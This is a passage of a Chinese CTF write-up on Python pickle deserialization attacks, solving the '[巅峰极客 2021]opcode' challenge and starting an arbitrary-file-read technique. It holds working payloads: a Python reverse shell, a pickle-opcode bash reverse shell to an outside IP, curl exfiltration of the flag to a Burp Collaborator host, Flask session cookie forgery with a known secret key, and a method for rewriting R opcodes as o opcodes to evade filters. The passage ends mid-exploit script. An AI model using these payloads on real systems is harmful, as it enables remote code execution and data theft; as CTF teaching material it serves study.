&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;import sys,socket,os,pty;s=socket.socket();s.connect((&amp;#34;8.8.8.8&amp;#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子8 - [巅峰极客 2021]opcode
&lt;/h4>
&lt;/summary>
&lt;p>首页是登录框，任意值均可登入 明面上没什么东西 抓包后看到post传入参数有三个 username, password, imagePath，这里的imagePath也可进行任意文件读取，看一下后端源码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024145247073.png" alt="image-20211024145247073">&lt;/p>
&lt;p>第一眼看过去是p牛的题和另一个题的杂交了，限制builtins并且不能有R操作码，入口处在44行的&lt;code>session['data']&lt;/code>处&lt;/p>
&lt;p>但是我没仔细注意的地方是17行，跟p牛的那个题一对比就能看出来这样的写法&lt;u>因为是单独的def而不是在对PickleSerializer进行修改，完全做不到重写&lt;code>pickle.loads&lt;/code>方法，只是个摆设&lt;/u>，相当于仅对R操作码进行了限制，笑嘻了&lt;/p>
&lt;p>直接上&lt;code>eval()&lt;/code>+&lt;code>b'o'&lt;/code>来弹shell了，不多bb&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/101.35.113.107/8426 0&amp;amp;1&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者是用&lt;code>system()&lt;/code>+&lt;code>curl&lt;/code>+&lt;code>b'o'&lt;/code>外带flag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">system&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl burp_collaborator.net/?flag=`app/readflag`&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后生成b64的内容（用&lt;code>'''&lt;/code>的好处是不用考虑太多引号转义的问题&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;xxxxxxxxxxxxxx&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>cookie的生成就是flask_session_cookie_manager一把梭了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;y0u-wi11_neuer_kn0vv-!@#se%32&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#39;{&amp;#34;data&amp;#34;: &amp;#34;xxxxb64_contentxxxx&amp;#34;, &amp;#34;username&amp;#34;: &amp;#34;adminadmin&amp;#34;}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>————如果按照题目原有的意思，限制&lt;code>builtins&lt;/code>+&lt;code>b'R'&lt;/code>操作码也是很好做出来的&lt;/p>
&lt;p>先用pker生成带R的opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后手搓，在调用callable前添加MARK即&lt;code>(&lt;/code>，去掉&lt;code>t&lt;/code>和调用&lt;code>t&lt;/code>用到的MARK&lt;/p>
&lt;p>也就是&lt;code>[callable] [tuple] R===&amp;gt;MARK [callable] [args...] o&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;#39;&amp;#39;&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0(g0\ng1\nS&amp;#39;get&amp;#39;\nop2\n0cbuiltins\nglobals\np3\n0(g3\nop4\n0(g2\ng4\nS&amp;#39;__builtins__&amp;#39;\nop5\n0(g0\ng5\nS&amp;#39;eval&amp;#39;\nop6\n0(g6\nS&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;\no.&amp;#39;&amp;#39;&amp;#39;
&lt;/code>&lt;/pre>&lt;p>可以看下区别&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024165337816.png" alt="image-20211024165337816">&lt;/p>
&lt;p>修改都是一对一对的，&lt;strong>总结一下方法就是&lt;code>0gx&lt;/code>要变为&lt;code>0(gx&lt;/code>，&lt;code>(gx&lt;/code>要变为&lt;code>gx&lt;/code> ，&lt;code>tR&lt;/code>换成&lt;code>o&lt;/code>&lt;/strong>&lt;/p>
&lt;p>参考：&lt;a href="https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-6">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--使用_getattributeload_objload_inst实现任意文件读取">&amp;ndash;&amp;raquo;使用&lt;code>_getattribute()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>实现任意文件读取&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>find_class()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Subclasses may override this.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">audit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.find_class&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">proto&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fix_imports&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">NAME_MAPPING&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">NAME_MAPPING&lt;/span>&lt;span style="color:#111">[(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">elif&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IMPORT_MAPPING&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IMPORT_MAPPING&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">__import__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">level&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">proto&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">_getattribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>_getattribute()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_getattribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;locals&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t get local attribute &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200"> on &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">parent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">subpath&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t get attribute &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200"> on &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">None&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parent&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>read()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>仍然以上面webtmp(究极缝合怪)的题为例，我们可以利用上面的函数，创建一个Animal的实例，然后将name或category的值设置为read wrapper的返回值&lt;/p>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;(&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload_suffix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;i__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">read&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_suffix&lt;/span>
